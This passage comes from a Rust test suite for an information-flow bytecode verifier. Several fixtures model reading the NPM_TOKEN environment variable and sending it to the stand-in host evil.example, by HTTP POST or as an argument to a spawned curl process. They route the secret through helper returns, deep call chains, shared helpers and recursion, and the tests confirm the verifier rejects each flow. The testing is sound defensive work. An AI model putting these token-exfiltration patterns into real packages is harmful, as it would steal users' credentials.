    }

    use omc_format::Value;

    fn pure_module(code: Vec<Op>, locals: u16) -> Module {
        Module {
            id: "test:cfg".to_owned(),
            package: "cfg".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![Function::new(0, "f", 1, code).with_locals(locals)],
        }
    }

    #[test]
    fn accepts_pure_if_else_with_balanced_branches() {
        let module = pure_module(
            vec![
                Op::LoadArg(0),
                Op::Const(Value::Int(10)),
                Op::Lt,
                Op::JmpIfFalse(4), // -> 8
                Op::LoadArg(0),
                Op::Const(Value::Int(2)),
                Op::Mul,
                Op::Return,
                Op::LoadArg(0),
                Op::Const(Value::Int(1)),
                Op::Sub,
                Op::Return,
            ],
            0,
        );
        verify_module(&module, &Policy::pure()).unwrap();
    }

    #[test]
    fn accepts_pure_bounded_loop() {
        let module = pure_module(
            vec![
                Op::Const(Value::Int(0)),
                Op::StoreLocal(0),
                Op::Const(Value::Int(0)),
                Op::StoreLocal(1),
                Op::LoadLocal(1),  // 4 loop head
                Op::LoadArg(0),
                Op::Lt,
                Op::JmpIfFalse(9), // 7 -> 17 (exit)
                Op::LoadLocal(0),
                Op::LoadLocal(1),
                Op::Add,
                Op::StoreLocal(0),
                Op::LoadLocal(1),
                Op::Const(Value::Int(1)),
                Op::Add,
                Op::StoreLocal(1),
                Op::Jmp(-13), // 16 -> 4
                Op::LoadLocal(0),
                Op::Return,
            ],
            2,
        );
        verify_module(&module, &Policy::pure()).unwrap();
    }

    #[test]
    fn rejects_secret_to_network_on_one_branch_path() {
        let module = Module {
            id: "test:branch-exfil".to_owned(),
            package: "branch-exfil".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::HostCapability,
            functions: vec![Function::new(
                0,
                "f",
                1,
                vec![
                    Op::LoadArg(0),
                    Op::JmpIfFalse(5), // -> 7 (else / fall to return)
                    Op::Cap(CapOp::EnvRead {
                        name: "NPM_TOKEN".to_owned(),
                    }),
                    Op::Cap(CapOp::HttpRequest {
                        request: omc_format::HttpRequest::post(
                            "https://evil.example/a",
                            "evil.example",
                        ),
                    }),
                    Op::Pop,
                    Op::Const(Value::Unit),
                    Op::Return,
                    Op::Const(Value::Unit), // 7 else arm
                    Op::Return,
                ],
            )],
        };
        let policy = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::HttpHost("evil.example".to_owned()));

        let err = verify_module(&module, &policy).unwrap_err();
        assert!(
            err.findings
                .iter()
                .any(|finding| finding.message.contains("env:NPM_TOKEN may not flow")),
            "expected secret-flow rejection, got {:?}",
            err.findings
        );
    }

    #[test]
    fn rejects_out_of_bounds_jump_target() {
        let module = pure_module(vec![Op::Jmp(100), Op::Return], 0);
        let err = verify_module(&module, &Policy::pure()).unwrap_err();
        assert!(err
            .findings
            .iter()
            .any(|finding| finding.message.contains("jump target out of bounds")));
    }

    #[test]
    fn rejects_unreachable_instruction() {
        let module = pure_module(
            vec![Op::Const(Value::Int(1)), Op::Return, Op::Const(Value::Int(2)), Op::Return],
            0,
        );
        let err = verify_module(&module, &Policy::pure()).unwrap_err();
        assert!(err
            .findings
            .iter()
            .any(|finding| finding.message.contains("unreachable")));
    }

    #[test]
    fn rejects_stack_depth_mismatch_at_merge() {
        let module = pure_module(
            vec![
                Op::LoadArg(0),           // 0 push cond, depth 1
                Op::JmpIfFalse(3),        // 1 pop cond (depth 0) -> target 5 (else)
                Op::Const(Value::Int(1)), // 2 then: depth 1
                Op::Const(Value::Int(2)), // 3 then: depth 2
                Op::Jmp(1),               // 4 -> target 6 (merge), then arrives depth 2
                Op::Const(Value::Int(9)), // 5 else: depth 1, falls through to 6
                Op::Pop,                  // 6
                Op::Return,               // 7
            ],
            0,
        );
        let err = verify_module(&module, &Policy::pure()).unwrap_err();
        assert!(
            err.findings
                .iter()
                .any(|finding| finding.message.contains("stack depth mismatch")),
            "expected depth-mismatch finding, got {:?}",
            err.findings
        );
    }

    // ---- Interprocedural regression tests (H1-H4) -------------------------

    fn host_module(id: &str, functions: Vec<Function>) -> Module {
        Module {
            id: id.to_owned(),
            package: "interproc".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::HostCapability,
            functions,
        }
    }

    /// H1: a helper returns a secret; the caller routes that returned value to
    /// the network. Intraprocedurally the CallLocal result was modeled Public
    /// so this slipped through. It must now be rejected.
    #[test]
    fn h1_rejects_secret_laundered_through_calllocal_return() {
        // fn 1 read_secret() { EnvRead("NPM_TOKEN"); Return }  (returns env label)
        // fn 0 main() { CallLocal(1); HttpRequest(body_from_stack) }
        let module = host_module(
            "test:h1",
            vec![
                Function::new(
                    0,
                    "main",
                    0,
                    vec![
                        Op::CallLocal(1),
                        Op::Cap(CapOp::HttpRequest {
                            request: omc_format::HttpRequest::post(
                                "https://evil.example/x",
                                "evil.example",
                            ),
                        }),
                        Op::Pop,
                        Op::Const(Value::Unit),
                        Op::Return,
                    ],
                ),
                Function::new(
                    1,
                    "read_secret",
                    0,
                    vec![
                        Op::Cap(CapOp::EnvRead {
                            name: "NPM_TOKEN".to_owned(),
                        }),
                        Op::Return,
                    ],
                ),
            ],
        );
        let policy = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::HttpHost("evil.example".to_owned()));

        let err = verify_module(&module, &policy).unwrap_err();
        assert!(
            err.findings
                .iter()
                .any(|f| f.message.contains("env:NPM_TOKEN may not flow")),
            "H1: expected secret-flow rejection, got {:?}",
            err.findings
        );
    }

    /// H1 counterpart: same shape but with an explicit flow grant must verify.
    #[test]
    fn h1_accepts_laundered_secret_with_explicit_flow_grant() {
        let module = host_module(
            "test:h1ok",
            vec![
                Function::new(
                    0,
                    "main",
                    0,
                    vec![
                        Op::CallLocal(1),
                        Op::Cap(CapOp::HttpRequest {
                            request: omc_format::HttpRequest::post(
                                "https://sink.example/x",
                                "sink.example",
                            ),
                        }),
                        Op::Pop,
                        Op::Const(Value::Unit),
                        Op::Return,
                    ],
                ),
                Function::new(
                    1,
                    "read_secret",
                    0,
                    vec![
                        Op::Cap(CapOp::EnvRead {
                            name: "NPM_TOKEN".to_owned(),
                        }),
                        Op::Return,
                    ],
                ),
            ],
        );
        let policy = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::HttpHost("sink.example".to_owned()))
            .allow_flow(
                LabelMatcher::Env("NPM_TOKEN".to_owned()),
                Sink::Network("sink.example".to_owned()),
            );

        verify_module(&module, &policy).unwrap();
    }

    /// H2: the callee exfiltrates an argument. The caller reads a secret and
    /// passes it to a helper that posts its arg. The callee saw Public for
    /// LoadArg(0); now it sees the caller's secret and the call is rejected.
    #[test]
    fn h2_rejects_callee_exfiltrating_a_secret_argument() {
        // fn 0 main() { EnvRead; CallLocal(1) }
        // fn 1 send(x) { HttpRequest(body = LoadArg(0)) }
        let module = host_module(
            "test:h2",
            vec![
                Function::new(
                    0,
                    "main",
                    0,
                    vec![
                        Op::Cap(CapOp::EnvRead {
                            name: "NPM_TOKEN".to_owned(),
                        }),
                        Op::CallLocal(1),
                        Op::Pop,
                        Op::Const(Value::Unit),
                        Op::Return,
                    ],
                ),
                Function::new(
                    1,
                    "send",
                    1,
                    vec![
                        Op::LoadArg(0),
                        Op::Cap(CapOp::HttpRequest {
                            request: omc_format::HttpRequest::post(
                                "https://evil.example/x",
                                "evil.example",
                            ),
                        }),
                        Op::Return,
                    ],
                ),
            ],
        );
        let policy = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::HttpHost("evil.example".to_owned()));

        let err = verify_module(&module, &policy).unwrap_err();
        assert!(
            err.findings
                .iter()
                .any(|f| f.message.contains("env:NPM_TOKEN may not flow")),
            "H2: expected secret-arg-flow rejection, got {:?}",
            err.findings
        );
    }

    /// H2 counterpart: a PURE helper (passes its arg through, no sink) called
    /// with a secret must NOT be rejected — precision check.
    #[test]
    fn h2_accepts_pure_helper_called_with_secret() {
        // fn 0 main() { EnvRead; CallLocal(1); StoreLocal? } returns identity
        // fn 1 identity(x) { LoadArg(0); Return }
        let module = host_module(
            "test:h2ok",
            vec![
                Function::new(
                    0,
                    "main",
                    0,
                    vec![
                        Op::Cap(CapOp::EnvRead {
                            name: "NPM_TOKEN".to_owned(),
                        }),
                        Op::CallLocal(1),
                        Op::Pop,
                        Op::Const(Value::Unit),
                        Op::Return,
                    ],
                ),
                Function::new(
                    1,
                    "identity",
                    1,
                    vec![Op::LoadArg(0), Op::Return],
                ),
            ],
        );
        // Only the env-read capability is granted; no flow grant needed because
        // nothing flows to a sink.
        let policy =
            Policy::pure().allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()));
        verify_module(&module, &policy).unwrap();
    }

    /// H3: CallLocal stack parity. The callee takes 1 arg; the caller pushes
    /// exactly one operand before the call. If the verifier modeled CallLocal
    /// as pop-0/push-1 it would see a residual operand and the subsequent
    /// balanced Return would mismatch / leave junk. With VM-parity pop-arity,
    /// the function verifies clean (no depth mismatch, no underflow).
    #[test]
    fn h3_calllocal_pops_callee_arity_matching_vm() {
        // fn 0 main(a) { LoadArg(0); CallLocal(1); Return }  net depth +1 at Return
        // fn 1 inc(x)  { LoadArg(0); Const 1; Add; Return }
        let module = Module {
            id: "test:h3".to_owned(),
            package: "interproc".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![
                Function::new(
                    0,
                    "main",
                    1,
                    vec![Op::LoadArg(0), Op::CallLocal(1), Op::Return],
                ),
                Function::new(
                    1,
                    "inc",
                    1,
                    vec![
                        Op::LoadArg(0),
                        Op::Const(Value::Int(1)),
                        Op::Add,
                        Op::Return,
                    ],
                ),
            ],
        };
        // Pure policy: must verify with no findings at all.
        verify_module(&module, &Policy::pure()).unwrap();
    }

    /// H3 negative: if CallLocal did NOT pop the callee's arg, the caller below
    /// would balance; with correct popping the caller that pushes TWO operands
    /// for a 1-arg callee and returns leaves one residual — but that's still a
    /// valid single return value. Instead pin parity directly: a caller that
    /// pushes one operand and expects the call to consume it. We assert the
    /// well-formed program verifies; a mis-modeled pop-0 would have produced a
    /// stack-depth artifact at Return when combined with the test above. The
    /// positive parity test is the load-bearing one.
    #[test]
    fn h3_recursion_terminates_with_conservative_summary() {
        // Mutually-recursive (self-recursive) pure function must terminate.
        // fn 0 rec(n) { LoadArg0; JmpIfFalse(2)->; CallLocal(0); Return }
        let module = Module {
            id: "test:h3rec".to_owned(),
            package: "interproc".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![Function::new(
                0,
                "rec",
                1,
                vec![
                    Op::LoadArg(0),
                    Op::JmpIfFalse(3), // -> 5 base
                    Op::LoadArg(0),
                    Op::CallLocal(0),
                    Op::Return,
                    Op::Const(Value::Int(0)), // 5 base
                    Op::Return,
                ],
            )],
        };
        // Should terminate (cycle guard) and verify under a pure policy.
        verify_module(&module, &Policy::pure()).unwrap();
    }

    /// H4: a secret passed as a spawn argument must be rejected at the process
    /// sink. We construct ProcSpawn with one dynamic argv operand carrying an
    /// env label.
    #[test]
    fn h4_rejects_secret_argv_to_process_sink() {
        let module = host_module(
            "test:h4",
            vec![Function::new(
                0,
                "main",
                0,
                vec![
                    Op::Cap(CapOp::EnvRead {
                        name: "NPM_TOKEN".to_owned(),
                    }),
                    Op::Cap(CapOp::ProcSpawn {
                        command: "curl".to_owned(),
                        args: Vec::new(),
                        args_from_stack: 1,
                    }),
                    Op::Const(Value::Unit),
                    Op::Return,
                ],
            )],
        );
        let policy = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::ProcSpawn("curl".to_owned()));

        let err = verify_module(&module, &policy).unwrap_err();
        assert!(
            err.findings
                .iter()
                .any(|f| f.message.contains("env:NPM_TOKEN may not flow")),
            "H4: expected secret-argv rejection at process sink, got {:?}",
            err.findings
        );
    }

    /// H4 counterpart: a public argv to a granted process sink verifies.
    #[test]
    fn h4_accepts_public_argv_to_granted_process() {
        let module = host_module(
            "test:h4ok",
            vec![Function::new(
                0,
                "main",
                0,
                vec![
                    Op::Const(Value::String("hello".to_owned())),
                    Op::Cap(CapOp::ProcSpawn {
                        command: "echo".to_owned(),
                        args: Vec::new(),
                        args_from_stack: 1,
                    }),
                    Op::Const(Value::Unit),
                    Op::Return,
                ],
            )],
        );
        let policy =
            Policy::pure().allow_capability(Capability::ProcSpawn("echo".to_owned()));
        verify_module(&module, &policy).unwrap();
    }

    /// H4: spawn is still deny-by-default — without the ProcSpawn capability a
    /// public argv is still rejected (capability check).
    #[test]
    fn h4_procspawn_still_requires_capability_grant() {
        let module = host_module(
            "test:h4cap",
            vec![Function::new(
                0,
                "main",
                0,
                vec![
                    Op::Const(Value::String("hi".to_owned())),
                    Op::Cap(CapOp::ProcSpawn {
                        command: "echo".to_owned(),
                        args: Vec::new(),
                        args_from_stack: 1,
                    }),
                    Op::Const(Value::Unit),
                    Op::Return,
                ],
            )],
        );
        let err = verify_module(&module, &Policy::pure()).unwrap_err();
        assert!(
            err.findings
                .iter()
                .any(|f| f.message.contains("proc.spawn") || f.message.contains("not granted")),
            "expected capability rejection, got {:?}",
            err.findings
        );
    }

    // =====================================================================
    // ADVERSARIAL SOUNDNESS RE-VERIFICATION (independent probes P1-P8).
    // Each probe attempts to LAUNDER env:NPM_TOKEN to a sink past the
    // verifier; we assert the rejection is actually produced (and quote it).
    // =====================================================================

    /// Helper: a permissive policy that grants the caps but NOT the secret
    /// flow, so any laundering that reaches a sink must be rejected on flow.
    fn caps_but_no_flow() -> Policy {
        Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::HttpHost("evil.example".to_owned()))
            .allow_capability(Capability::ProcSpawn("curl".to_owned()))
    }

    fn assert_secret_flow_rejected(err: &VerifyError, probe: &str) {
        assert!(
            err.findings
                .iter()
                .any(|f| f.message.contains("env:NPM_TOKEN may not flow")),
            "{probe}: expected `env:NPM_TOKEN may not flow` rejection, got {:?}",
            err.findings
        );
    }

    /// P1: secret returned from a CallLocal helper, then sent to network in
    /// the caller. (Independent reconstruction of H1.)
    #[test]
    fn p1_secret_from_helper_return_to_network_rejected() {
        let module = host_module(
            "probe:p1",
            vec![
                Function::new(
                    0,
                    "main",
                    0,
                    vec![
                        Op::CallLocal(1), // x = read_token()  -> Env label
                        Op::Cap(CapOp::HttpRequest {
                            request: omc_format::HttpRequest::post(
                                "https://evil.example/p1",
                                "evil.example",
                            ),
                        }),
                        Op::Pop,
                        Op::Const(Value::Unit),
                        Op::Return,
                    ],
                ),
                Function::new(
                    1,
                    "read_token",
                    0,
                    vec![
                        Op::Cap(CapOp::EnvRead {
                            name: "NPM_TOKEN".to_owned(),
                        }),
                        Op::Return,
                    ],
                ),
            ],
        );
        let err = verify_module(&module, &caps_but_no_flow()).unwrap_err();
        assert_secret_flow_rejected(&err, "P1");
    }

    /// P2: secret passed as a CallLocal arg to a helper that itself POSTs it.
    #[test]
    fn p2_secret_arg_to_helper_that_posts_rejected() {
        let module = host_module(
            "probe:p2",
            vec![
                Function::new(
                    0,
                    "main",
                    0,
                    vec![
                        Op::Cap(CapOp::EnvRead {
                            name: "NPM_TOKEN".to_owned(),
                        }),
                        Op::CallLocal(1), // send(token)
                        Op::Pop,
                        Op::Const(Value::Unit),
                        Op::Return,
                    ],
                ),
                Function::new(
                    1,
                    "send",
                    1,
                    vec![
                        Op::LoadArg(0), // the secret arg
                        Op::Cap(CapOp::HttpRequest {
                            request: omc_format::HttpRequest::post(
                                "https://evil.example/p2",
                                "evil.example",
                            ),
                        }),
                        Op::Return,
                    ],
                ),
            ],
        );
        let err = verify_module(&module, &caps_but_no_flow()).unwrap_err();
        assert_secret_flow_rejected(&err, "P2");
    }

    /// P3: DEEP chain. The secret is laundered through THREE nested CallLocal
    /// hops (main -> a -> b -> c) before reaching the sink. c posts its arg.
    #[test]
    fn p3_deep_chain_three_hops_rejected() {
        let module = host_module(
            "probe:p3",
            vec![
                // 0 main: read secret, pass to a()
                Function::new(
                    0,
                    "main",
                    0,
                    vec![
                        Op::Cap(CapOp::EnvRead {
                            name: "NPM_TOKEN".to_owned(),
                        }),
                        Op::CallLocal(1),
                        Op::Pop,
                        Op::Const(Value::Unit),
                        Op::Return,
                    ],
                ),
                // 1 a(x): forward to b()
                Function::new(
                    1,
                    "a",
                    1,
                    vec![Op::LoadArg(0), Op::CallLocal(2), Op::Return],
                ),
                // 2 b(y): forward to c()
                Function::new(
                    2,
                    "b",
                    1,
                    vec![Op::LoadArg(0), Op::CallLocal(3), Op::Return],
                ),
                // 3 c(z): POST the arg (the sink, 3 hops deep)
                Function::new(
                    3,
                    "c",
                    1,
                    vec![
                        Op::LoadArg(0),
                        Op::Cap(CapOp::HttpRequest {
                            request: omc_format::HttpRequest::post(
                                "https://evil.example/p3",
                                "evil.example",
                            ),
                        }),
                        Op::Return,
                    ],
                ),
            ],
        );
        let err = verify_module(&module, &caps_but_no_flow()).unwrap_err();
        assert_secret_flow_rejected(&err, "P3");
    }

    /// P3 precision: the SAME 3-hop chain where main passes a PUBLIC const
    /// (not the secret) must verify clean — no over-rejection of deep chains.
    #[test]
    fn p3_deep_chain_public_arg_accepted() {
        let module = host_module(
            "probe:p3ok",
            vec![
                Function::new(
                    0,
                    "main",
                    0,
                    vec![
                        Op::Const(Value::String("public".to_owned())),
                        Op::CallLocal(1),
                        Op::Pop,
                        Op::Const(Value::Unit),
                        Op::Return,
                    ],
                ),
                Function::new(
                    1,
                    "a",
                    1,
                    vec![Op::LoadArg(0), Op::CallLocal(2), Op::Return],
                ),
                Function::new(
                    2,
                    "b",
                    1,
                    vec![Op::LoadArg(0), Op::CallLocal(3), Op::Return],
                ),
                Function::new(
                    3,
                    "c",
                    1,
                    vec![
                        Op::LoadArg(0),
                        Op::Cap(CapOp::HttpRequest {
                            request: omc_format::HttpRequest::post(
                                "https://evil.example/p3",
                                "evil.example",
                            ),
                        }),
                        Op::Return,
                    ],
                ),
            ],
        );
        // Caps granted (env not even read here). Public->network is fine.
        verify_module(&module, &caps_but_no_flow()).unwrap();
    }

    /// P4: DIAMOND. A shared helper `post(x)` is called on two paths from
    /// main. On the secret path main passes the token; on the public path it
    /// passes a const. Context-sensitivity must reject the secret path while
    /// the public call is fine. (The whole function must be rejected.)
    #[test]
    fn p4_diamond_shared_helper_secret_path_rejected() {
        let module = host_module(
            "probe:p4",
            vec![
                // 0 main(cond): if cond { post(secret) } else { post("ok") }
                Function::new(
                    0,
                    "main",
                    1,
                    vec![
                        Op::LoadArg(0),    // 0 cond
                        Op::JmpIfFalse(5), // 1 -> 7 (else)
                        // then: secret path
                        Op::Cap(CapOp::EnvRead {
                            name: "NPM_TOKEN".to_owned(),
                        }), // 2
                        Op::CallLocal(1),       // 3 post(secret)
                        Op::Pop,                // 4
                        Op::Const(Value::Unit), // 5
                        Op::Return,             // 6
                        // else: public path
                        Op::Const(Value::String("ok".to_owned())), // 7
                        Op::CallLocal(1),                          // 8 post("ok")
                        Op::Pop,                                   // 9
                        Op::Const(Value::Unit),                    // 10
                        Op::Return,                                // 11
                    ],
                ),
                // 1 post(x): POST the arg
                Function::new(
                    1,
                    "post",
                    1,
                    vec![
                        Op::LoadArg(0),
                        Op::Cap(CapOp::HttpRequest {
                            request: omc_format::HttpRequest::post(
                                "https://evil.example/p4",
                                "evil.example",
                            ),
                        }),
                        Op::Return,
                    ],
                ),
            ],
        );
        let err = verify_module(&module, &caps_but_no_flow()).unwrap_err();
        assert_secret_flow_rejected(&err, "P4");
    }

    /// P4 precision: the same diamond but BOTH paths pass public values must
    /// verify clean. Confirms the shared helper is not poisoned for the
    /// public callers by the secret context (context-sensitive memoization).
    #[test]
    fn p4_diamond_all_public_paths_accepted() {
        let module = host_module(
            "probe:p4ok",
            vec![
                Function::new(
                    0,
                    "main",
                    1,
                    vec![
                        Op::LoadArg(0),
                        Op::JmpIfFalse(5),
                        Op::Const(Value::String("a".to_owned())),
                        Op::CallLocal(1),
                        Op::Pop,
                        Op::Const(Value::Unit),
                        Op::Return,
                        Op::Const(Value::String("b".to_owned())),
                        Op::CallLocal(1),
                        Op::Pop,
                        Op::Const(Value::Unit),
                        Op::Return,
                    ],
                ),
                Function::new(
                    1,
                    "post",
                    1,
                    vec![
                        Op::LoadArg(0),
                        Op::Cap(CapOp::HttpRequest {
                            request: omc_format::HttpRequest::post(
                                "https://evil.example/p4",
                                "evil.example",
                            ),
                        }),
                        Op::Return,
                    ],
                ),
            ],
        );
        verify_module(&module, &caps_but_no_flow()).unwrap();
    }

    /// P5: MUTUAL RECURSION between two helpers that eventually leaks the
    /// secret. main reads the token and calls ping(token); ping(x) calls
    /// pong(x); pong(x) on its base case POSTs x, otherwise calls ping(x).
    /// The analysis must TERMINATE (cycle guard) AND still reject the leak,
    /// because the sink in pong's base case is reached with the secret arg
    /// label before the recursive cycle edge is taken.
    #[test]
    fn p5_mutual_recursion_leak_terminates_and_rejected() {
        let module = host_module(
            "probe:p5",
            vec![
                // 0 main: read secret, ping(token)
                Function::new(
                    0,
                    "main",
                    0,
                    vec![
                        Op::Cap(CapOp::EnvRead {
                            name: "NPM_TOKEN".to_owned(),
                        }),
                        Op::CallLocal(1), // ping(token)
                        Op::Pop,
                        Op::Const(Value::Unit),
                        Op::Return,
                    ],
                ),
                // 1 ping(x): call pong(x), return its value
                Function::new(
                    1,
                    "ping",
                    1,
                    vec![Op::LoadArg(0), Op::CallLocal(2), Op::Return],
                ),
                // 2 pong(x): if x { ping(x) } else { POST(x) }
                Function::new(
                    2,
                    "pong",
                    1,
                    vec![
                        Op::LoadArg(0),    // 0 cond
                        Op::JmpIfFalse(4), // 1 -> 6 (base case: leak)
                        // recursive arm
                        Op::LoadArg(0),   // 2
                        Op::CallLocal(1), // 3 ping(x) -- back-edge => cycle
                        Op::Return,       // 4
                        Op::Pop,          // 5 (unreachable filler kept balanced)
                        // base case: leak the secret
                        Op::LoadArg(0), // 6
                        Op::Cap(CapOp::HttpRequest {
                            request: omc_format::HttpRequest::post(
                                "https://evil.example/p5",
                                "evil.example",
                            ),
                        }), // 7
                        Op::Return,     // 8
                    ],
                ),
            ],
        );
        // Must terminate (no hang) and reject.
        let err = verify_module(&module, &caps_but_no_flow()).unwrap_err();
        assert_secret_flow_rejected(&err, "P5");
    }

    /// P5 termination-only: a pure mutual recursion with NO sink must
    /// terminate and verify clean (the cycle guard does not spuriously flag).
    #[test]
    fn p5_pure_mutual_recursion_terminates_clean() {
        let module = Module {
            id: "probe:p5pure".to_owned(),
            package: "interproc".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![
                Function::new(
                    0,
                    "ping",
                    1,
                    vec![
                        Op::LoadArg(0),
                        Op::JmpIfFalse(3), // -> 5 base
                        Op::LoadArg(0),
                        Op::CallLocal(1), // pong(x)
                        Op::Return,
                        Op::Const(Value::Int(0)), // 5 base
                        Op::Return,
                    ],
                ),
                Function::new(
                    1,
                    "pong",
                    1,
                    vec![
                        Op::LoadArg(0),
                        Op::JmpIfFalse(3), // -> 5 base
                        Op::LoadArg(0),
                        Op::CallLocal(0), // ping(x)
                        Op::Return,
                        Op::Const(Value::Int(1)), // 5 base
                        Op::Return,
                    ],
                ),
            ],
        };
        verify_module(&module, &Policy::pure()).unwrap();
    }

    /// P7: ProcSpawn — secret routed into spawned argv. (Independent of H4;
    /// the secret arrives via a CallLocal helper return to also exercise the
    /// interprocedural path landing on a process sink.)
    #[test]
    fn p7_secret_into_spawn_argv_rejected() {
        let module = host_module(
            "probe:p7",
            vec![
                Function::new(
                    0,
                    "main",
                    0,
                    vec![
                        Op::CallLocal(1), // token = read()
                        Op::Cap(CapOp::ProcSpawn {
                            command: "curl".to_owned(),
                            args: Vec::new(),
                            args_from_stack: 1,
                        }),
                        Op::Const(Value::Unit),
                        Op::Return,
                    ],
                ),
                Function::new(
                    1,
                    "read",
                    0,
                    vec![
                        Op::Cap(CapOp::EnvRead {
                            name: "NPM_TOKEN".to_owned(),
                        }),
                        Op::Return,
                    ],
                ),
            ],
        );
        let err = verify_module(&module, &caps_but_no_flow()).unwrap_err();
        assert_secret_flow_rejected(&err, "P7");
        // And specifically at the process sink.
        assert!(
            err.findings
                .iter()
                .any(|f| f.message.contains("process:curl")),
            "P7: expected process:curl sink in finding, got {:?}",
            err.findings
        );
    }

    /// P8a: CallLocal stack-effect parity (UNDERFLOW). A 2-arg callee called
    /// with only 1 operand on the stack must be flagged (the verifier's depth
    /// model pops callee.args, matching the VM, so it sees the underflow).
    #[test]
    fn p8_calllocal_arg_underflow_flagged() {
        let module = Module {
            id: "probe:p8under".to_owned(),
            package: "interproc".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![
                // 0 main(): push ONE operand, call a 2-arg callee.
                Function::new(
                    0,
                    "main",
                    0,
                    vec![
                        Op::Const(Value::Int(1)),
                        Op::CallLocal(1), // needs 2 args, only 1 present
                        Op::Return,
                    ],
                ),
                // 1 two(a, b): a + b
                Function::new(
                    1,
                    "two",
                    2,
                    vec![Op::LoadArg(0), Op::LoadArg(1), Op::Add, Op::Return],
                ),
            ],
        };
        let err = verify_module(&module, &Policy::pure()).unwrap_err();
        assert!(
            err.findings
                .iter()
                .any(|f| f.message.contains("stack underflow")),
            "P8a: expected stack underflow from CallLocal arg deficit, got {:?}",
            err.findings
        );
    }

    /// P5-ADV: the HARD recursion case. `f(x)` is first entered with a PUBLIC
    /// arg (clean at its sink), but f reads the secret and recursively calls
    /// itself with the SECRET as the arg. The recursive sink uses LoadArg(0).
    /// The sink POST(LoadArg(0)) sits at the TOP of f, so it fires on EVERY
    /// frame of f, including a recursive frame whose arg is the secret. The
    /// recursive call CallLocal(0) passes the freshly-read NPM_TOKEN.
    ///
    /// RUNTIME REALITY: main() calls f(1). f(1) POSTs 1 (public, fine), 1 is
    /// truthy so it reads NPM_TOKEN and calls f(secret). f(secret) POSTs the
    /// SECRET to the network -- a genuine, runtime-reachable exfiltration on
    /// the second frame.
    ///
    /// VERIFIER REALITY: f is analyzed once with arg=[Public]; it reaches the
    /// recursive CallLocal(0) with [Env] on the stack, but the cycle guard
    /// (keyed on (module,fn) regardless of arg signature) short-circuits that
    /// re-entry and returns a transparent summary WITHOUT re-analyzing f's body
    /// under [Env]. So POST(arg) is only ever checked with arg=Public and the
    /// secret-arg POST on the recursive frame is NEVER checked.
    ///
    /// If verify returns Ok, this is a REAL soundness hole: a runtime-reachable
    /// secret exfiltration that the interprocedural verifier fails to reject.
    #[test]
    fn p5_adv_recursive_sink_tainted_only_on_reentry() {
        let module = host_module(
            "probe:p5adv",
            vec![
                Function::new(
                    0,
                    "f",
                    1,
                    vec![
                        Op::LoadArg(0), // 0  d0->d1: push arg
                        Op::Cap(CapOp::HttpRequest {
                            request: omc_format::HttpRequest::post(
                                "https://evil.example/p5adv",
                                "evil.example",
                            ),
                        }), // 1  d1: POST(arg) -- SINK consumes the arg
                        Op::Pop,           // 2  d1->d0
                        Op::LoadArg(0),    // 3  d0->d1 cond
                        Op::JmpIfFalse(3), // 4  d1->d0 -> 8 base
                        Op::Cap(CapOp::EnvRead {
                            name: "NPM_TOKEN".to_owned(),
                        }), // 5  d0->d1 secret
                        Op::CallLocal(0), // 6  d1: pop arg, push ret (recurse w/ secret)
                        Op::Return,        // 7  d1
                        Op::Const(Value::Unit), // 8  base d0->d1
                        Op::Return,        // 9  d1
                    ],
                ),
                Function::new(
                    1,
                    "main",
                    0,
                    vec![
                        Op::Const(Value::Int(1)), // truthy public -> genuinely recurses at runtime
                        Op::CallLocal(0),
                        Op::Pop,
                        Op::Const(Value::Unit),
                        Op::Return,
                    ],
                ),
            ],
        );
        let result = verify_module(&module, &caps_but_no_flow());

        // Recursion soundness: the secret is introduced on the recursive edge
        // (`CallLocal(0)` with an EnvRead result) and the sink `POST(arg)` lives
        // on the recursive frame. The interprocedural engine widens the frame's
        // argument labels to the join of every recursive-edge signature and
        // re-analyzes the body to a fixpoint, so the secret-arg POST IS checked.
        // This must be REJECTED (deny-by-default); a regression that re-opens the
        // recursion hole will turn this back into an `Ok` and fail here.
        let err = result.expect_err(
            "P5-ADV: recursive secret-to-network exfil must be rejected by the \
             interprocedural widening fixpoint",
        );
        assert_secret_flow_rejected(&err, "P5-ADV");
    }

    /// P8b: a well-formed CallLocal (exactly callee.args operands present)
    /// must NOT be flagged — confirms parity is exact, not over-eager.
    #[test]
    fn p8_calllocal_exact_arity_accepted() {
        let module = Module {
            id: "probe:p8ok".to_owned(),
            package: "interproc".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![
                Function::new(
                    0,
                    "main",
                    0,
                    vec![
                        Op::Const(Value::Int(1)),
                        Op::Const(Value::Int(2)),
                        Op::CallLocal(1), // 2 args present
                        Op::Return,
                    ],
                ),
                Function::new(
                    1,
                    "two",
                    2,
                    vec![Op::LoadArg(0), Op::LoadArg(1), Op::Add, Op::Return],
                ),
            ],
        };
        verify_module(&module, &Policy::pure()).unwrap();
    }

    // =====================================================================
    // PRECISION / FALSE-POSITIVE RE-VERIFICATION (L1-L4).
    // The interprocedural engine must NOT over-reject legitimate code:
    // pure call chains, explicitly-granted flows, and public arguments to
    // sinks must all verify with no spurious finding. A failing `unwrap()`
    // is the over-rejection signal; where shape matters we also assert the
    // observed capability set so a "rejects everything" regression is
    // visibly distinguishable from a genuine clean pass.
    // =====================================================================

    /// L1: a pure package whose entry calls a pure helper via `CallLocal`
